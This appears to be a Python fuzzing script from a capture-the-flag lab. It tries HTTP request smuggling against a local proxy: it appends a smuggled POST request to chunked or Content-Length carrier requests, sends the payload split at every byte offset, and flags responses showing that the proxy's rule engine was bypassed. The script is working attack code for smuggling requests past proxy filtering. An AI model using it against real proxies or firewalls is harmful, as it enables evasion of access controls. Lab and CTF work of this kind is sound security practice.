#!/usr/bin/env python3
"""
segfuzz - exercise proxoxy's INCREMENTAL-READ resume paths.

Every fuzz on this challenge so far (ours and the ledger's) wrote the whole
payload in one sendall, so `HttpFraming::advance` saw each message in a single
call.  advance is a resumable state machine: on a partial read it saves a
cursor and later restarts the head scan at max(start, saved-3) and a
chunk-size / trailer line scan at max(line_start, saved-1).  Those resume
arithmetic paths are only reachable when the message arrives in pieces.

Same oracle as framefuzz: <carrier><POST /FLAGTOK9 ... brevski: george ...>
into the echo lab (proxoxy + hex-echo backend, 38889).  If /FLAGTOK9 comes back,
the rule engine never evaluated that request head.
"""
import socket, sys, binascii, time

TARGET = ("127.0.0.1", 38889)
TOK = b"/FLAGTOK9"


def smug(val=b"george"):
    return (b"POST " + TOK + b" HTTP/1.1\r\nHost: h\r\nbrevski: " + val
            + b"\r\nContent-Length: 0\r\n\r\n")


def fwd_split(payload, cuts, gap=0.008, wait=0.15):
    try:
        s = socket.create_connection(TARGET, timeout=2)
    except Exception:
        return None
    try:
        prev = 0
        for c in list(cuts) + [len(payload)]:
            if c <= prev:
                continue
            s.sendall(payload[prev:c])
            prev = c
            time.sleep(gap)
        s.settimeout(wait)
        out = b""
        try:
            while True:
                d = s.recv(262144)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
    except Exception:
        return b""
    finally:
        try:
            s.close()
        except Exception:
            pass
    seen = b""
    while out:
        i = out.find(b"\r\n\r\n")
        if i < 0:
            break
        head = out[:i]
        j = head.lower().find(b"content-length:")
        if j < 0:
            break
        n = int(head[j + 15:].split(b"\r\n")[0].strip())
        try:
            seen += binascii.unhexlify(out[i + 4:i + 4 + n])
        except Exception:
            pass
        out = out[i + 4 + n:]
    return seen


HEAD = b"POST /carrier HTTP/1.1\r\nHost: h\r\n"


def chunk(b, n=8):
    o = b""
    for i in range(0, len(b), n):
        p = b[i:i + n]
        o += ("%x" % len(p)).encode() + b"\r\n" + p + b"\r\n"
    return o


CARRIERS = [
    ("te0",        HEAD + b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"),
    ("te.tr",      HEAD + b"Transfer-Encoding: chunked\r\n\r\n0\r\nX: v\r\n\r\n"),
    ("te.data",    HEAD + b"Transfer-Encoding: chunked\r\n\r\n" + chunk(b"AAAABBBBCCCC") + b"0\r\n\r\n"),
    ("te.ext",     HEAD + b"Transfer-Encoding: chunked\r\n\r\n0;a=b\r\n\r\n"),
    ("cl0",        HEAD + b"Content-Length: 0\r\n\r\n"),
    ("cl8",        HEAD + b"Content-Length: 8\r\n\r\nAAAABBBB"),
    ("te.2tr",     HEAD + b"Transfer-Encoding: chunked\r\n\r\n0\r\nX: v\r\nY: w\r\n\r\n"),
    ("te.datatr",  HEAD + b"Transfer-Encoding: chunked\r\n\r\n" + chunk(b"AAAA") + b"0\r\nX: v\r\n\r\n"),
]


def main():
    gap = float(sys.argv[1]) if len(sys.argv) > 1 else 0.008
    ctl = fwd_split(HEAD + b"Content-Length: 0\r\n\r\n" + smug(b"zzz"), [])
    ctl2 = fwd_split(HEAD + b"Content-Length: 0\r\n\r\n" + smug(b"george"), [])
    print("CONTROL zzz-token=%s george-token=%s" % (TOK in (ctl or b""), TOK in (ctl2 or b"")))
    if TOK not in (ctl or b"") or TOK in (ctl2 or b""):
        print("controls failed"); return
    total = wins = 0
    t0 = time.time()
    for name, car in CARRIERS:
        pay = car + smug(b"george")
        for cut in range(1, len(pay)):
            total += 1
            r = fwd_split(pay, [cut], gap=gap, wait=0.10)
            if r and TOK in r:
                wins += 1
                print("*** BYPASS *** carrier=%s cut=%d\n  payload=%r\n  fwd=%r"
                      % (name, cut, pay, r))
                sys.stdout.flush()
        print("%-10s done (%d cuts)  wins=%d  elapsed=%.0fs" % (name, len(pay) - 1, wins, time.time() - t0))
        sys.stdout.flush()
    print("total %d single-cut splits, %d bypasses" % (total, wins))


main()
